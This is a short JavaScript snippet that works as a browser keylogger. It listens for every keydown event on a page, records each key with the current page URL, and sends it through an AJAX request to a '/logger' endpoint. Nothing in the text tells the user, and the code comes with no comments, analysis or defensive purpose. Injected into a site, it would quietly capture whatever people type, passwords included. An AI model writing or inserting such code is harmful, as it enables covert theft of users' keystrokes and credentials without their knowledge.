document.addEventListener('keydown', function (event) {
    var char = event.key;
    char = char === ' ' ? 'Space' : char;
    keylog = char + ' in [' + window.location.href + ']';
    $.ajax({url: '/logger?msg=' + encodeURIComponent(keylog)});
});
